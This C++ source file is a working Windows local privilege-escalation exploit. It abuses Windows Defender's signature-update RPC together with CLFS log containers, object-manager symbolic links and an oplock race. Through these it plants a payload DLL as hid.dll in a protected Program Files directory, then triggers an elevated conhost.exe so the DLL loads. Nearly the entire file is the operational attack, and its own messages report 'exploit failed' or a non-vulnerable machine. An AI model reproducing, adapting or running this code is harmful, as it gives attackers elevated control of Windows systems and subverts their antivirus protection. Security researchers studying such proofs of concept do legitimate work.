#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <Windows.h>
#include <string.h>
#include <winternl.h>
#include <conio.h>
#include <Shlwapi.h>
#include <ntstatus.h>
#include <aclapi.h>
#include <TlHelp32.h>
#include <ktmw32.h>
#include "resource.h"
#include "windefend_h.h"

#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "Rpcrt4.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "ktmw32.lib")


HMODULE hm = GetModuleHandle(L"ntdll.dll");
NTSTATUS(WINAPI* _NtCreateSymbolicLinkObject)(
	OUT PHANDLE             pHandle,
	IN ACCESS_MASK          DesiredAccess,
	IN POBJECT_ATTRIBUTES   ObjectAttributes,
	IN PUNICODE_STRING      DestinationName) = (NTSTATUS(WINAPI*)(
		OUT PHANDLE             pHandle,
		IN ACCESS_MASK          DesiredAccess,
		IN POBJECT_ATTRIBUTES   ObjectAttributes,
		IN PUNICODE_STRING      DestinationName))GetProcAddress(hm, "NtCreateSymbolicLinkObject");
NTSTATUS(WINAPI* _NtOpenDirectoryObject)(
	PHANDLE            DirectoryHandle,
	ACCESS_MASK        DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes
	) = (NTSTATUS(WINAPI*)(
		PHANDLE            DirectoryHandle,
		ACCESS_MASK        DesiredAccess,
		POBJECT_ATTRIBUTES ObjectAttributes
		))GetProcAddress(hm, "NtOpenDirectoryObject");

struct WDRPCWorkerThreadArgs
{
	HANDLE hntfythread;
	HANDLE hevent;
	RPC_STATUS res;
	wchar_t* dirpath;
};


//////////////////////////////////////////////////////////////////////
// Functions required by RPC
/////////////////////////////////////////////////////////////////////

void __RPC_FAR* __RPC_USER midl_user_allocate(size_t cBytes)
{
	return((void __RPC_FAR*) malloc(cBytes));
}

void __RPC_USER midl_user_free(void __RPC_FAR* p)
{
	free(p);
}
//////////////////////////////////////////////////////////////////////
// Functions required by RPC end
/////////////////////////////////////////////////////////////////////


void GenerateGUID(wchar_t* guid)
{
	GUID _guid;
	HRESULT hr = CoCreateGuid(&_guid);
	if (hr)
		throw STATUS_ACCESS_VIOLATION;
	StringFromGUID2(_guid, guid, 40);
	return;
}

void CallWD(WDRPCWorkerThreadArgs* args)
{
	RPC_WSTR MS_WD_UUID = (RPC_WSTR)L"c503f532-443a-4c69-8300-ccd1fbdb3839";
	RPC_WSTR StringBinding;
	if (RpcStringBindingComposeW(MS_WD_UUID, (RPC_WSTR)L"ncalrpc", NULL, (RPC_WSTR)L"IMpService77BDAF73-B396-481F-9042-AD358843EC24", NULL, &StringBinding) != RPC_S_OK)
	{
		printf("Unexpected error while building an RPC binding from string !!!");
		ExitProcess(1);
		return;
	}
	RPC_BINDING_HANDLE bindhandle = 0;
	if (RpcBindingFromStringBindingW(StringBinding, &bindhandle) != RPC_S_OK)
	{
		printf("Failed to connect to windows defender RPC port !!!");
		ExitProcess(1);
		return;
	}
	error_status_t errstat = 0;
	RPC_STATUS stat = Proc42_ServerMpUpdateEngineSignature(bindhandle, NULL, args->dirpath, &errstat);
	args->res = stat;
	if (args->hevent)
		SetEvent(args->hevent);
}


static BOOL Negotiate(HANDLE hLogFile, PULONGLONG cbContainer, const std::wstring& path)
{
	struct NegotiateCtx
	{
		ULONGLONG cbContainer;
		USHORT cContainer;
	};
	DWORD sz = sizeof(NegotiateCtx) + 2 * (path.size() + 1);
	auto ptr = std::make_unique<UCHAR[]>(sz);
	NegotiateCtx* ctx = reinterpret_cast<NegotiateCtx*>(ptr.get());
	ctx->cbContainer = *cbContainer;
	ctx->cContainer = 1;
	wcscpy_s(reinterpret_cast<PWCHAR>(ptr.get() + sizeof(NegotiateCtx)), path.size() + 1, path.c_str());
	DWORD bytesReturned;
	return DeviceIoControl(hLogFile, 0x8007A808, ctx, sz, cbContainer, sizeof(ULONGLONG), &bytesReturned, NULL);
}
void TerminateOskProcess()
{

	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (Process32First(snapshot, &entry) == TRUE)
	{
		while (Process32Next(snapshot, &entry) == TRUE)
		{
			if (_wcsicmp(entry.szExeFile, L"osk.exe") == 0)
			{
				HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, entry.th32ProcessID);
				TerminateProcess(hProcess, ERROR_SUCCESS);
				CloseHandle(hProcess);
			}
		}
	}
	CloseHandle(snapshot);
}
int main()
{
	TerminateOskProcess();
	ShellExecute(NULL, L"open", L"osk.exe", NULL, NULL, SW_HIDE);
	Sleep(100);
	wchar_t rguid[64] = { 0 };
	wchar_t rguid2[64] = { 0 };
	wchar_t rguid3[64] = { 0 };
	GenerateGUID(rguid);
	GenerateGUID(rguid2);
	GenerateGUID(rguid3);
	FILE_DISPOSITION_INFO fdi = { 0 };
	fdi.DeleteFileW = TRUE;
	wchar_t workdir[MAX_PATH] = { 0 };
	ExpandEnvironmentStrings(L"\\??\\%TEMP%\\SigDrop_", workdir, MAX_PATH);
	GenerateGUID(&workdir[wcslen(workdir)]);
	UNICODE_STRING _workdir = { 0 };
	RtlInitUnicodeString(&_workdir, workdir);
	OBJECT_ATTRIBUTES objattr = { 0 };
	InitializeObjectAttributes(&objattr, &_workdir, OBJ_CASE_INSENSITIVE, NULL, NULL);
	IO_STATUS_BLOCK iostat = { 0 };
	HANDLE hworkdir = NULL;
	NTSTATUS stat = NtCreateFile(&hworkdir, GENERIC_READ | SYNCHRONIZE | DELETE, &objattr, &iostat, NULL, NULL, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_CREATE, FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT | FILE_DELETE_ON_CLOSE, NULL, NULL);
	if (stat)
	{
		printf("Failed to create work directory : %ws error : 0x%0.8X\n", workdir, stat);
		return 1;
	}
	iostat = { 0 };
	wchar_t clfslog[MAX_PATH] = { 0 };
	wsprintf(clfslog, L"\\CLFS%ws\\%ws", workdir, rguid);
	UNICODE_STRING _clfslog = { 0 };
	RtlInitUnicodeString(&_clfslog, clfslog);
	OBJECT_ATTRIBUTES objattr2 = { 0 };
	InitializeObjectAttributes(&objattr2, &_clfslog, OBJ_CASE_INSENSITIVE, NULL, NULL);
	HANDLE hclfslog = NULL;
	stat = NtCreateFile(&hclfslog, GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE | DELETE, &objattr2, &iostat, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_CREATE, FILE_SYNCHRONOUS_IO_NONALERT, NULL, NULL);
	if (stat)
	{
		printf("Failed to create clfs log file, error : 0x%0.8X\n", stat);
		return 1;
	}
	std::wstring newcontainerpath = L"\\BaseNamedObjects\\Restricted\\" + std::wstring(rguid);
	std::wstring newcontainerpathsig = newcontainerpath + L".cnpf";
	wchar_t smtarget[MAX_PATH] = { 0 };
	wchar_t smtargetsig[MAX_PATH] = { 0 };
	wsprintf(smtarget, L"%ws\\%ws", workdir, rguid2);
	wsprintf(smtargetsig, L"%ws.cnpf", smtarget);
	UNICODE_STRING ncontainerpath = { 0 };
	UNICODE_STRING ncontainerpathsig = { 0 };
	RtlInitUnicodeString(&ncontainerpath, newcontainerpath.c_str());
	RtlInitUnicodeString(&ncontainerpathsig, newcontainerpathsig.c_str());
	UNICODE_STRING ncontainertarget = { 0 };
	UNICODE_STRING ncontainertargetsig = { 0 };
	RtlInitUnicodeString(&ncontainertarget, smtarget);
	RtlInitUnicodeString(&ncontainertargetsig, smtargetsig);
	OBJECT_ATTRIBUTES ncontainerobjattr = { 0 };
	OBJECT_ATTRIBUTES ncontainersigobjattr = { 0 };
	InitializeObjectAttributes(&ncontainerobjattr, &ncontainerpath, OBJ_CASE_INSENSITIVE, NULL, NULL);
	InitializeObjectAttributes(&ncontainersigobjattr, &ncontainerpathsig, OBJ_CASE_INSENSITIVE, NULL, NULL);
	HANDLE hsm1 = NULL;
	HANDLE hsm2 = NULL;
	stat = _NtCreateSymbolicLinkObject(&hsm1, GENERIC_ALL, &ncontainerobjattr, &ncontainertarget);
	NTSTATUS stat2 = _NtCreateSymbolicLinkObject(&hsm2, GENERIC_ALL, &ncontainersigobjattr, &ncontainertargetsig);
	if (stat || stat2)
	{
		printf("Failed to create object manager symbolic links, error : 0x%0.8X | 0x%0.8X\n", stat, stat2);
		SetFileInformationByHandle(hclfslog, FileDispositionInfo, &fdi, sizeof(fdi));
		CloseHandle(hclfslog);
		return 1;
	}
	ULONGLONG cbsz = 512;
	std::wstring logpath = L"\\CLFS";
	logpath.append(newcontainerpath);
	if (!Negotiate(hclfslog, &cbsz, newcontainerpath))
	{
		printf("Failed to create CLFS containers, error : %d\n",GetLastError());
		SetFileInformationByHandle(hclfslog, FileDispositionInfo, &fdi, sizeof(fdi));
		CloseHandle(hclfslog);
		return 1;
	}
	HANDLE htest = NULL;
	iostat = { 0 };
	stat = NtCreateFile(&htest, SYNCHRONIZE | FILE_READ_ATTRIBUTES, &ncontainersigobjattr, &iostat, NULL, NULL, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
		FILE_OPEN, FILE_NON_DIRECTORY_FILE, NULL, NULL);
	if (stat == STATUS_OBJECT_NAME_NOT_FOUND || stat == STATUS_OBJECT_PATH_NOT_FOUND)
	{
		printf("This machine is not vulnerable.\n");
		SetFileInformationByHandle(hclfslog, FileDispositionInfo, &fdi, sizeof(fdi));
		CloseHandle(hclfslog);
		return 0;
	}	
	CloseHandle(hclfslog);
	iostat = { 0 };
	HANDLE hlock = NULL;
	UNICODE_STRING mpengstr = { 0 };
	RtlInitUnicodeString(&mpengstr, L"MpEngine.dll");
	OBJECT_ATTRIBUTES mpengobjattr = { 0 };
	InitializeObjectAttributes(&mpengobjattr, &mpengstr, OBJ_CASE_INSENSITIVE, hworkdir, NULL);
	stat = NtCreateFile(&hlock, GENERIC_WRITE | DELETE | SYNCHRONIZE, &mpengobjattr, &iostat, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_CREATE, NULL, NULL, NULL);
	if (stat)
	{
		printf("Failed to create bait file, error : 0x%0.8X\n", stat);
		return 1;
	}

	OVERLAPPED ovd = { 0 };
	REQUEST_OPLOCK_INPUT_BUFFER opin = { 0 };
	opin.StructureLength = sizeof(opin);
	opin.StructureVersion = REQUEST_OPLOCK_CURRENT_VERSION;
	opin.RequestedOplockLevel = OPLOCK_LEVEL_CACHE_READ | OPLOCK_LEVEL_CACHE_HANDLE | OPLOCK_LEVEL_CACHE_WRITE;
	opin.Flags = REQUEST_OPLOCK_INPUT_FLAG_REQUEST;
	REQUEST_OPLOCK_OUTPUT_BUFFER opout = { 0 };
	opout.StructureLength = sizeof(opout);
	opout.StructureVersion = REQUEST_OPLOCK_CURRENT_VERSION;
	DWORD cb = NULL;
	ovd.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
	if (!DeviceIoControl(hlock, FSCTL_REQUEST_OPLOCK, &opin, sizeof(opin), &opout, sizeof(opout), &cb, &ovd)) {
		if (GetLastError() != ERROR_IO_PENDING) {
			printf("Failed to create oplock, error : %d\n", GetLastError());
			return 1;
		}
	}
	HANDLE hupdsm = NULL;
	wchar_t lnkpath[MAX_PATH] = { L"\\BaseNamedObjects\\Restricted\\" };
	wcscat(lnkpath, rguid3);
	UNICODE_STRING updir = { 0 };
	RtlInitUnicodeString(&updir, lnkpath);
	OBJECT_ATTRIBUTES objattrupd = { 0 };
	InitializeObjectAttributes(&objattrupd, &updir, OBJ_CASE_INSENSITIVE, NULL, NULL);
	UNICODE_STRING updirtarget = { 0 };
	RtlInitUnicodeString(&updirtarget, workdir);
	stat = _NtCreateSymbolicLinkObject(&hupdsm, GENERIC_ALL, &objattrupd, &updirtarget);
	if (stat)
	{
		printf("Failed to create update directory symbolic link, error : 0x%0.8X\n", stat);
		return 1;
	}

	char buff[0x1000];
	DWORD ret = 0;
	wchar_t inkdir[] = { L"C:\\Program Files\\Common Files\\microsoft shared\\ink" };
	HANDLE hmonitor = CreateFile(inkdir, GENERIC_READ | SYNCHRONIZE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OVERLAPPED, NULL);
	if (!hmonitor || hmonitor == INVALID_HANDLE_VALUE)
	{
		printf("Failed to open %ws directory, error : %d\n", inkdir, GetLastError());
		return 1;
	}
	OVERLAPPED ov2 = { 0 };
	ov2.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
	if (!ov2.hEvent)
	{
		printf("Failed to create event for monitoring, error : %d\n", GetLastError());
		return 1;
	}
	ZeroMemory(buff, sizeof(buff));
	ret = 0;
	if (!ReadDirectoryChangesW(hmonitor, buff, sizeof(buff), FALSE, FILE_NOTIFY_CHANGE_FILE_NAME, &ret, &ov2, NULL))
	{
		printf("Failed to create directory watch, error : %d\n", GetLastError());
		return 1;
	}

	WDRPCWorkerThreadArgs wdargs = { 0 };
	wchar_t dipath[MAX_PATH] = { L"\\\\.\\GlobalRoot\\BaseNamedObjects\\Restricted\\" };
	wcscat(dipath, rguid3);
	wdargs.dirpath = dipath;
	wdargs.hntfythread = OpenThread(THREAD_ALL_ACCESS, FALSE, GetCurrentThreadId());
	wdargs.hevent = CreateEvent(NULL, FALSE, FALSE, NULL);
	DWORD tid = 0;
	HANDLE hthread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)CallWD, &wdargs, NULL, &tid);
	if (!hthread)
	{
		printf("Unexpected failure creating worker thread, error : %d\n",GetLastError());
		return 1;
	}

	WaitForSingleObject(ovd.hEvent, INFINITE);
	SetFileInformationByHandle(hlock, FileDispositionInfo, &fdi, sizeof(fdi));
	CloseHandle(hupdsm);
	RtlInitUnicodeString(&updirtarget, L"\\BaseNamedObjects\\Restricted");
	stat = _NtCreateSymbolicLinkObject(&hupdsm, GENERIC_ALL, &objattrupd, &updirtarget);
	if (stat)
	{
		printf("Failed to create update directory symbolic link, error : 0x%0.8X\n", stat);
		return 1;
	}
	UNICODE_STRING rclfssrc = { 0 };
	RtlInitUnicodeString(&rclfssrc, L"\\BaseNamedObjects\\Restricted\\mpasbase.vdm");
	OBJECT_ATTRIBUTES rclfsobjattr = { 0 };
	InitializeObjectAttributes(&rclfsobjattr, &rclfssrc, OBJ_CASE_INSENSITIVE, NULL, NULL);
	HANDLE hlastsm = NULL;
	stat = _NtCreateSymbolicLinkObject(&hlastsm, GENERIC_ALL, &rclfsobjattr, &_clfslog);
	if (stat)
	{
		printf("Failed to create symbolic link object, error : 0x%0.8X\n", GetLastError());
		return 1;
	}
	CloseHandle(hsm2);
	RtlInitUnicodeString(&ncontainertargetsig, L"\\??\\C:\\Program Files\\Common Files\\microsoft shared\\ink\\hid.dll");
	stat = _NtCreateSymbolicLinkObject(&hsm2, GENERIC_ALL, &ncontainersigobjattr, &ncontainertargetsig);
	if (stat)
	{
		printf("Failed to create symbolic link object, error : 0x%0.8X\n", GetLastError());
		return 1;
	}
	CloseHandle(hlock);

	if (WaitForSingleObject(ov2.hEvent, 5000) == WAIT_TIMEOUT)
	{
		printf("exploit failed.\n");
		return 1;
	}
	else {
		goto enter_loop;
	}
	do{
		ResetEvent(ov2.hEvent);
		ZeroMemory(buff, sizeof(buff));
		ret = 0;
		if (!ReadDirectoryChangesW(hmonitor, buff, sizeof(buff), FALSE, FILE_NOTIFY_CHANGE_FILE_NAME, &ret, &ov2, NULL))
		{
			printf("Failed to create directory watch, error : %d\n",GetLastError());
			return 1;
		}
	enter_loop:
		FILE_NOTIFY_INFORMATION* fni = (FILE_NOTIFY_INFORMATION*)buff;
		if (fni->Action == FILE_ACTION_ADDED)
		{
			if (_wcsicmp(fni->FileName, L"hid.dll") == 0)
			{
				break;
			}
		}
		if (WaitForSingleObject(ov2.hEvent, 5000) == WAIT_TIMEOUT)
		{
			printf("exploit failed.\n");
			return 1;
		}
	} while (1);

	HANDLE htrans = CreateTransaction(NULL, NULL, NULL, NULL, NULL, NULL, NULL);
	if (!htrans || htrans == INVALID_HANDLE_VALUE)
	{
		printf("Failed to create transaction, error : %d\n", GetLastError());
		return 1;
	}

	HANDLE hbin = NULL;
	do {
		Sleep(100);
		hbin = CreateFile(L"C:\\Program Files\\Common Files\\microsoft shared\\ink\\hid.dll", GENERIC_READ | GENERIC_EXECUTE | GENERIC_WRITE | MAXIMUM_ALLOWED, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	} while (!hbin || hbin == INVALID_HANDLE_VALUE);
	HRSRC hResInfo_dll = FindResource(NULL, MAKEINTRESOURCE(IDR_DLL1), L"dll");
	HGLOBAL hResData_dll = LoadResource(NULL, hResInfo_dll);
	LPVOID pResourceData_dll = LockResource(hResData_dll);
	DWORD dwSize_dll = SizeofResource(NULL, hResInfo_dll);
	DWORD ttb = NULL;
	LARGE_INTEGER fsz = { 0 };
	fsz.QuadPart = dwSize_dll;
	HANDLE hmapping = CreateFileMapping(hbin, NULL, PAGE_READWRITE, fsz.HighPart, fsz.LowPart, NULL);
	if (!hmapping || hmapping == INVALID_HANDLE_VALUE)
	{
		printf("Failed to map target file to memory, error : %d\n", GetLastError());
		SetFileInformationByHandle(hbin, FileDispositionInfo, &fdi, sizeof(fdi));
		CloseHandle(hbin);
		return 1;
	}
	void* filebuff = MapViewOfFile(hmapping, FILE_MAP_READ | FILE_MAP_WRITE, NULL, NULL, NULL);
	if (!filebuff)
	{
		CloseHandle(hmapping);
		SetFileInformationByHandle(hbin, FileDispositionInfo, &fdi, sizeof(fdi));
		CloseHandle(hbin);
		printf("Failed to map target file to memory, error : %d\n", GetLastError());
		return 1;
	}
	memmove(filebuff, pResourceData_dll, dwSize_dll);
	UnmapViewOfFile(filebuff);
	CloseHandle(hmapping);
	FlushFileBuffers(hbin);
	CloseHandle(hbin);
	ShellExecute(NULL, L"runas", L"C:\\Windows\\System32\\conhost.exe", NULL, NULL, SW_SHOW);
	Sleep(2000);
	TerminateOskProcess();
	DeleteFileTransacted(L"C:\\Program Files\\Common Files\\microsoft shared\\ink\\hid.dll",htrans);
	CommitTransaction(htrans);
	CloseHandle(htrans);
	return 0;
}
